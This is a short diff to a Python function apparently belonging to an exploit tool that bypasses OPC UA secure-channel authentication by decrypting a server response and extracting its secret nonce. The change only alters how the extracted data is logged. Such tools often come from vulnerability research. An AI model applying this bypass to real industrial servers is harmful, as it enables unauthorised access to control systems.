@@ -1244,10 +1244,9 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
     raise Exception(f'Failed to unpad RSA plaintext {hexlify(decrypted).decode()} (SP: {login_endpoint.securityPolicyUri})')
   
   # Assuming response fits in single plaintext block.
-  log('Removed padding. Now parsing OpenSecureChannelResponse.')
+  log('Removed padding. Now parsing OpenSecureChannelResponse to extract channel ID and secret nonce:')
   opn_resp, _ = openSecureChannelResponse.from_bytes(encodedConversation.from_bytes(unpadded)[0].requestOrResponse)
-  print(repr(opn_resp))
-  log_success(f'Extracted secret server nonce: {hexlify(opn_resp.serverNonce).decode()}')
+  log_object(opn_resp)
   
   return ChannelState(
     sock=login_sock,
